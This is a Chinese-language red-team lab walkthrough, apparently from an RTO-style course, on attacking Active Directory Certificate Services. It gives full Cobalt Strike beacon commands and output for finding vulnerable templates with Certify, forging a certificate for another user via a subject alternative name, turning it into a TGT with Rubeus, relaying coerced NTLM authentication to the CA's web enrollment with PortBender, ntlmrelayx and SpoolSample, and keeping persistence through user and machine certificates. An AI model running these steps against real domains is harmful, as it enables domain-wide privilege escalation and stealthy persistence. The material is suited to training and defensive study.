# Active Directory Certificate Services

Active Directory 证书服务错误配置可能会导致权限提升（普通域用户->DA），或者权限维持。

# Finding Certificate Authorities

使用工具[Certify](https://github.com/GhostPack/Certify)

查找证书颁发机构：
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```

output
```
[*] Enterprise/Enrollment CAs:
....
Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io -> CN=ca-2,DC=dev,DC=cyberbotic,DC=io
```

留意``` Cert Chain```字段

注意到Cert Chain是很有用的，因为这表明DEV域的CA-2是CYBER域的CA-1的下级。 输出结果还将列出每个 CA 可用的证书模板，以及关于哪些委托人被允许管理这些模板的一些信息。


# Misconfigured Certificate Templates

使用Certify查找证书漏洞
```
beacon> getuid
[*] You are CYBER\iyates

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```

![alt Active Directory Certificate Services](https://rto-assets.s3.eu-west-2.amazonaws.com/adcs/certify-vuln-template.png?width=1920)

需要留意的信息
1. The name of the Certificate Authority is **dc-1.cyberbotic.io\ca-1**.(证书颁发机构的名称是dc-1.cyberbotic.io\ca-1)
2. The template is called **VulnerableUserTemplate**.(该模板称为VulnerableUserTemplate)
3. **ENROLLEE_SUPPLIES_SUBJECT** allows the certificate requestor to provide a SAN (subject alternative name).(ENROLLEE_SUPPLIES_SUBJECT允许证书请求者提供 SAN（主题备用名称）)
4. The certificate usage has **Client Authentication set**.(证书使用设置了客户端身份验证)
5. Domain Users have enrolment rights, so **any domain user** may request a certificate from this template(域用户具有注册权限，因此任何域用户都可以从此模板请求证书)



因为上面配置运行任何域用户请求证书，并使用它对域进行身份验证，所以这里为nglover服务请求证书
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover

···
···

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA7+QJhT7SgrP2SLWI7JqilriLBFjGRgob7sK6Gt8/EN4ODCqA
[...snip...]
EZCgtNFHJpynmPVNEcocncFPtV1hskXIElcwer/EdIROOW+qZhan
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGKzCCBROgAwIBAgITIQAAAAJ1qRjA3m3TOAAAAAAAAjANBgkqhkiG9w0BAQsF
[...snip...]
Xm58FnNpAvwXQi1Vu+xIdtpRSGsnl6T6/TYwJlhKqMEU9mRfgaWXgLS+HdS++aw=
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:16.3844085
```

复制整个证书（包括RSA PRIVATE KEY部分）并将其保存到Kali VM 上，取名cert.pem 。然后使用openssl命令将其转换为 pfx 格式。可以输入密码（推荐）或将其留空
```
root@kali:~# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```


转换cert.pfx为 base64 编码字符串：  ```cat cert.pfx | base64 -w 0```并用于```Rubeus asktgt```使用此证书请求 TGT
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:nglover /certificate:MIIM5wIBAz[...snip...]dPAgIIAA== /password:password /aes256 /nowrap
```

# NTLM Relaying to ADCS HTTP Endpoints

AD CS services支持HTTP注册，通常站点的结构是：

```http[s]://<hostname>/certsrv```

默认情况下支持```NTLM``` 和 ```Negotiate```身份验证

在默认配置中，这些站点容易受到 NTLM 中继攻击，一种常见的滥用方法是强制域控制器对攻击者控制器位置进行身份验证，将请求中继到 CA 并获取该 DC 的证书，然后使用它来获取 TGT

这里要注意一个点，中继攻击不能中继自己，比如说这里CA是运行在DC-1上，这意味着我们不能 PrintSpooler（或其他）DC-1 并将其中继回同一台机器并获取 DC-1 的证书。

这时，我们利用域里的另外两台机器来进行中继攻击

这里的IP和主机对应是：

10.10.15.75 -> DC-1
10.10.15.254 -> WKSTN-3.
10.10.17.25 -> SRV-1


首先，在SRV-1上设置
1. 把445端口流量重定向到8445端口
2. 启动反向端口转发，把本地8445端口转到 Team Server（也就是kali机）的445端口
3. 开启socket代理

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
                                            
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP

beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445

beacon> socks 1080
[+] started SOCKS4a server on: 1080
```


在kali上开启NTML relaxy
```
root@kali:~# proxychains ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

注意10.10.15.75 是 DC-1.

强制 WKSTN-3（10.10.15.254）和SRV-1（10.10.17.25）进行身份验证
```
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.15.254 10.10.17.25
```

此时，在kali上将收到验证的tgt
```
[*] SMBD-Thread-4: Connection from CYBER/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.15.75
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
 ...  OK
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] SMBD-Thread-4: Connection from CYBER/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.15.75
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] GOT CERTIFICATE! ID 5
[*] Base64 certificate of user WKSTN-3$:
MIIQ3Q[...snip...]NzkQ==
```

得到tgt后再使用```S4U2self```（参考015-kerberos那章）技巧代表任何用户为机器上的任何服务获取 TGS


# User & Computer Persistence

用户&计算机权限维持

## 用户权限维持

查找所有客户端验证的证书
```
beacon> getuid
[*] You are DEV\nlamb

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /clientauth
```

![alt Persistence](https://rto-assets.s3.eu-west-2.amazonaws.com/adcs/user-cert-template.png?width=1920)

需要留意的参数：
1. The validity period is 1 year.(有效期为1年)
2. Authorization is not required.(不需要授权)
3. Domain Users in DEV have enrollment rights.（DEV 中的域用户都具有注册权限）

使用下面命令请求证书
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User
```

上面命令生成的证书允许我们使用 Rubeus 为 nlamb 请求 TGT。它的有效期为 1 年，即使用户更改了密码，它也仍然有效，除非证书在CA上被注销了。


## Computer Persistence

为计算机申请证书的命令大同小异
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine
```

```/machine```参数让Certify提升到system权限，执行上面命令时本身需要```high-integrity```的权限


# AD CS Auditing

AD CS logging默认不开启，如要开启需要配置以下选项

![alt Auditing](https://rto-assets.s3.eu-west-2.amazonaws.com/adcs/logging-options.png?width=1920)

